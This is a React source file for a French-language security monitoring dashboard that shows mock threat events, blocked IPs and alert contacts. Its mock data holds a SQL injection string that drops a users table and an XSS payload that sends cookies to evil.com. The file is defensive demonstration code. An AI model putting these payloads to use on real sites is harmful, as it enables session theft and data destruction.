"use client"

import { useState, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import {
  Shield, AlertTriangle, Ban, Activity, Globe, Clock,
  Smartphone, Monitor, ChevronRight, RefreshCw, Search,
  Eye, Lock, Unlock, Download, Filter, Zap, TrendingUp,
  Users, Server, Cpu, HardDrive, Wifi, ShieldAlert,
  ShieldCheck, ShieldX, MapPin, Fingerprint, Bug
} from 'lucide-react'
import { Button } from '@/components/ui/button'
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Input } from '@/components/ui/input'
import { ScrollArea } from '@/components/ui/scroll-area'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'
import { 
  THREAT_LEVEL_CONFIG, 
  THREAT_TYPE_LABELS,
  type ThreatEvent,
  type ThreatLevel 
} from '@/lib/security/cybersecurity'

// Mock data for demonstration
const MOCK_THREATS: ThreatEvent[] = [
  {
    id: '1',
    type: 'brute_force',
    level: 'high',
    ip: '192.168.1.105',
    country: 'Nigeria',
    city: 'Lagos',
    device: 'Desktop',
    browser: 'Chrome 120',
    os: 'Windows 11',
    fingerprint: 'a1b2c3d4',
    timestamp: new Date(Date.now() - 120000),
    endpoint: '/api/auth/login',
    requestCount: 47,
    blocked: true,
    alertsSent: true
  },
  {
    id: '2',
    type: 'sql_injection',
    level: 'critical',
    ip: '10.0.0.55',
    country: 'China',
    city: 'Beijing',
    device: 'Server',
    browser: 'Bot',
    os: 'Linux',
    fingerprint: 'x9y8z7w6',
    timestamp: new Date(Date.now() - 300000),
    endpoint: '/api/products?search=',
    payload: "'; DROP TABLE users; --",
    blocked: true,
    alertsSent: true
  },
  {
    id: '3',
    type: 'suspicious_login',
    level: 'medium',
    ip: '172.16.0.22',
    country: 'Cameroon',
    city: 'Douala',
    device: 'Mobile',
    browser: 'Safari 17',
    os: 'iOS 17',
    fingerprint: 'm4n5o6p7',
    timestamp: new Date(Date.now() - 600000),
    endpoint: '/api/auth/login',
    userId: 'user_12345',
    blocked: false,
    alertsSent: true
  },
  {
    id: '4',
    type: 'api_abuse',
    level: 'medium',
    ip: '203.0.113.50',
    country: 'Russia',
    city: 'Moscow',
    device: 'Desktop',
    browser: 'Firefox 121',
    os: 'Ubuntu 22',
    fingerprint: 'q1w2e3r4',
    timestamp: new Date(Date.now() - 900000),
    endpoint: '/api/products',
    requestCount: 1250,
    blocked: true,
    alertsSent: true
  },
  {
    id: '5',
    type: 'xss_attack',
    level: 'high',
    ip: '198.51.100.75',
    country: 'India',
    city: 'Mumbai',
    device: 'Desktop',
    browser: 'Edge 120',
    os: 'Windows 10',
    fingerprint: 't5u6v7w8',
    timestamp: new Date(Date.now() - 1200000),
    endpoint: '/api/reviews',
    payload: '<script>document.location="http://evil.com/steal?c="+document.cookie</script>',
    blocked: true,
    alertsSent: true
  }
]

const BLOCKED_IPS = ['192.168.1.105', '10.0.0.55', '203.0.113.50', '198.51.100.75']

export default function SecurityDashboardPage() {
  const [threats, setThreats] = useState<ThreatEvent[]>(MOCK_THREATS)
  const [blockedIPs, setBlockedIPs] = useState<string[]>(BLOCKED_IPS)
  const [selectedThreat, setSelectedThreat] = useState<ThreatEvent | null>(null)
  const [filter, setFilter] = useState<ThreatLevel | 'all'>('all')
  const [searchQuery, setSearchQuery] = useState('')
  const [isLive, setIsLive] = useState(true)

  // Stats
  const stats = {
    totalThreats: threats.length,
    blockedIPs: blockedIPs.length,
    criticalThreats: threats.filter(t => t.level === 'critical').length,
    highThreats: threats.filter(t => t.level === 'high').length,
    todayThreats: threats.filter(t => {
      const today = new Date()
      return t.timestamp.toDateString() === today.toDateString()
    }).length
  }

  // Filter threats
  const filteredThreats = threats.filter(t => {
    if (filter !== 'all' && t.level !== filter) return false
    if (searchQuery && !t.ip.includes(searchQuery) && !t.endpoint.includes(searchQuery)) return false
    return true
  })

  const unblockIP = (ip: string) => {
    setBlockedIPs(prev => prev.filter(i => i !== ip))
  }

  const blockIP = (ip: string) => {
    if (!blockedIPs.includes(ip)) {
      setBlockedIPs(prev => [...prev, ip])
    }
  }

  return (
    <div className="min-h-screen bg-background p-4 md:p-6">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-red-500 to-orange-500 flex items-center justify-center">
              <Shield className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">Centre de Securite</h1>
              <p className="text-sm text-muted-foreground">Surveillance et protection en temps reel</p>
            </div>
          </div>

          <div className="flex items-center gap-2">
            <Badge 
              variant={isLive ? "default" : "secondary"} 
              className={isLive ? "bg-green-500 animate-pulse" : ""}
            >
              {isLive ? "🟢 Live" : "⏸️ Pause"}
            </Badge>
            <Button variant="outline" size="sm" onClick={() => setIsLive(!isLive)}>
              {isLive ? "Pause" : "Reprendre"}
            </Button>
            <Button variant="outline" size="sm">
              <Download className="w-4 h-4 mr-2" />
              Export
            </Button>
          </div>
        </div>

        {/* Stats Cards */}
        <div className="grid grid-cols-2 md:grid-cols-5 gap-4">
          <Card className="bg-gradient-to-br from-red-500/10 to-red-500/5 border-red-500/20">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Critiques</p>
                  <p className="text-2xl font-bold text-red-500">{stats.criticalThreats}</p>
                </div>
                <ShieldX className="w-8 h-8 text-red-500/50" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-orange-500/10 to-orange-500/5 border-orange-500/20">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Elevees</p>
                  <p className="text-2xl font-bold text-orange-500">{stats.highThreats}</p>
                </div>
                <ShieldAlert className="w-8 h-8 text-orange-500/50" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-blue-500/10 to-blue-500/5 border-blue-500/20">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Total menaces</p>
                  <p className="text-2xl font-bold text-blue-500">{stats.totalThreats}</p>
                </div>
                <Bug className="w-8 h-8 text-blue-500/50" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-purple-500/10 to-purple-500/5 border-purple-500/20">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">IPs bloquees</p>
                  <p className="text-2xl font-bold text-purple-500">{stats.blockedIPs}</p>
                </div>
                <Ban className="w-8 h-8 text-purple-500/50" />
              </div>
            </CardContent>
          </Card>

          <Card className="bg-gradient-to-br from-green-500/10 to-green-500/5 border-green-500/20">
            <CardContent className="p-4">
              <div className="flex items-center justify-between">
                <div>
                  <p className="text-xs text-muted-foreground">Securite</p>
                  <p className="text-2xl font-bold text-green-500">98%</p>
                </div>
                <ShieldCheck className="w-8 h-8 text-green-500/50" />
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Main Content */}
        <div className="grid lg:grid-cols-3 gap-6">
          {/* Threats List */}
          <div className="lg:col-span-2 space-y-4">
            <Card>
              <CardHeader className="pb-3">
                <div className="flex items-center justify-between">
                  <CardTitle className="text-lg">Menaces detectees</CardTitle>
                  <div className="flex items-center gap-2">
                    <div className="relative">
                      <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
                      <Input
                        placeholder="Rechercher IP..."
                        value={searchQuery}
                        onChange={(e) => setSearchQuery(e.target.value)}
                        className="pl-9 w-40"
                      />
                    </div>
                    <select
                      value={filter}
                      onChange={(e) => setFilter(e.target.value as ThreatLevel | 'all')}
                      className="h-9 px-3 rounded-md border border-input bg-background text-sm"
                    >
                      <option value="all">Tous</option>
                      <option value="critical">Critique</option>
                      <option value="high">Eleve</option>
                      <option value="medium">Moyen</option>
                      <option value="low">Faible</option>
                    </select>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[500px]">
                  <div className="space-y-3">
                    <AnimatePresence>
                      {filteredThreats.map((threat, index) => (
                        <motion.div
                          key={threat.id}
                          initial={{ opacity: 0, x: -20 }}
                          animate={{ opacity: 1, x: 0 }}
                          exit={{ opacity: 0, x: 20 }}
                          transition={{ delay: index * 0.05 }}
                          onClick={() => setSelectedThreat(threat)}
                          className={`p-4 rounded-xl border cursor-pointer transition-all hover:shadow-md ${
                            THREAT_LEVEL_CONFIG[threat.level].bg
                          } ${selectedThreat?.id === threat.id ? 'ring-2 ring-primary' : ''}`}
                        >
                          <div className="flex items-start justify-between">
                            <div className="flex items-start gap-3">
                              <div className={`w-10 h-10 rounded-lg flex items-center justify-center ${THREAT_LEVEL_CONFIG[threat.level].bg}`}>
                                <span className="text-xl">{THREAT_LEVEL_CONFIG[threat.level].icon}</span>
                              </div>
                              <div>
                                <div className="flex items-center gap-2">
                                  <span className="font-semibold">{THREAT_TYPE_LABELS[threat.type]}</span>
                                  <Badge variant="outline" className={THREAT_LEVEL_CONFIG[threat.level].color}>
                                    {threat.level.toUpperCase()}
                                  </Badge>
                                </div>
                                <div className="flex items-center gap-3 mt-1 text-sm text-muted-foreground">
                                  <span className="flex items-center gap-1">
                                    <Globe className="w-3 h-3" />
                                    {threat.ip}
                                  </span>
                                  <span className="flex items-center gap-1">
                                    <MapPin className="w-3 h-3" />
                                    {threat.country}
                                  </span>
                                  <span className="flex items-center gap-1">
                                    <Clock className="w-3 h-3" />
                                    {threat.timestamp.toLocaleTimeString()}
                                  </span>
                                </div>
                                <p className="text-xs text-muted-foreground mt-1 truncate max-w-md">
                                  {threat.endpoint}
                                </p>
                              </div>
                            </div>
                            <div className="flex items-center gap-2">
                              {threat.blocked ? (
                                <Badge variant="destructive" className="text-xs">Bloque</Badge>
                              ) : (
                                <Button 
                                  size="sm" 
                                  variant="destructive"
                                  onClick={(e) => {
                                    e.stopPropagation()
                                    blockIP(threat.ip)
                                  }}
                                >
                                  <Ban className="w-3 h-3 mr-1" />
                                  Bloquer
                                </Button>
                              )}
                            </div>
                          </div>
                        </motion.div>
                      ))}
                    </AnimatePresence>
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>
          </div>

          {/* Sidebar */}
          <div className="space-y-4">
            {/* Threat Details */}
            {selectedThreat && (
              <Card>
                <CardHeader className="pb-3">
                  <CardTitle className="text-lg flex items-center gap-2">
                    <Eye className="w-5 h-5" />
                    Details de la menace
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="grid grid-cols-2 gap-3 text-sm">
                    <div>
                      <p className="text-muted-foreground">IP</p>
                      <p className="font-mono font-semibold">{selectedThreat.ip}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Pays</p>
                      <p className="font-semibold">{selectedThreat.country}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Ville</p>
                      <p className="font-semibold">{selectedThreat.city}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Device</p>
                      <p className="font-semibold">{selectedThreat.device}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">Navigateur</p>
                      <p className="font-semibold">{selectedThreat.browser}</p>
                    </div>
                    <div>
                      <p className="text-muted-foreground">OS</p>
                      <p className="font-semibold">{selectedThreat.os}</p>
                    </div>
                    <div className="col-span-2">
                      <p className="text-muted-foreground">Fingerprint</p>
                      <p className="font-mono text-xs">{selectedThreat.fingerprint}</p>
                    </div>
                  </div>

                  {selectedThreat.payload && (
                    <div>
                      <p className="text-muted-foreground text-sm mb-1">Payload suspect</p>
                      <pre className="p-2 bg-red-500/10 rounded text-xs font-mono text-red-500 overflow-x-auto">
                        {selectedThreat.payload}
                      </pre>
                    </div>
                  )}

                  <div className="flex gap-2">
                    {selectedThreat.blocked ? (
                      <Button 
                        variant="outline" 
                        className="flex-1"
                        onClick={() => unblockIP(selectedThreat.ip)}
                      >
                        <Unlock className="w-4 h-4 mr-2" />
                        Debloquer
                      </Button>
                    ) : (
                      <Button 
                        variant="destructive" 
                        className="flex-1"
                        onClick={() => blockIP(selectedThreat.ip)}
                      >
                        <Ban className="w-4 h-4 mr-2" />
                        Bloquer IP
                      </Button>
                    )}
                  </div>
                </CardContent>
              </Card>
            )}

            {/* Blocked IPs */}
            <Card>
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <Ban className="w-5 h-5 text-red-500" />
                  IPs bloquees ({blockedIPs.length})
                </CardTitle>
              </CardHeader>
              <CardContent>
                <ScrollArea className="h-[200px]">
                  <div className="space-y-2">
                    {blockedIPs.map((ip) => (
                      <div 
                        key={ip}
                        className="flex items-center justify-between p-2 rounded-lg bg-red-500/10"
                      >
                        <span className="font-mono text-sm">{ip}</span>
                        <Button 
                          size="sm" 
                          variant="ghost"
                          onClick={() => unblockIP(ip)}
                        >
                          <Unlock className="w-4 h-4" />
                        </Button>
                      </div>
                    ))}
                  </div>
                </ScrollArea>
              </CardContent>
            </Card>

            {/* Alert Settings */}
            <Card>
              <CardHeader className="pb-3">
                <CardTitle className="text-lg flex items-center gap-2">
                  <AlertTriangle className="w-5 h-5 text-yellow-500" />
                  Contacts d&apos;alerte
                </CardTitle>
              </CardHeader>
              <CardContent className="space-y-3">
                <div className="p-3 rounded-lg bg-muted/50">
                  <p className="text-sm font-medium">Email</p>
                  <p className="text-xs text-muted-foreground">solutionsdaveandluce@gmail.com</p>
                </div>
                <div className="p-3 rounded-lg bg-muted/50">
                  <p className="text-sm font-medium">WhatsApp</p>
                  <p className="text-xs text-muted-foreground">+237 694 341 586</p>
                  <p className="text-xs text-muted-foreground">+237 690 773 615</p>
                  <p className="text-xs text-muted-foreground">+41 77 976 87 68</p>
                </div>
                <Button variant="outline" className="w-full" size="sm">
                  Modifier les contacts
                </Button>
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
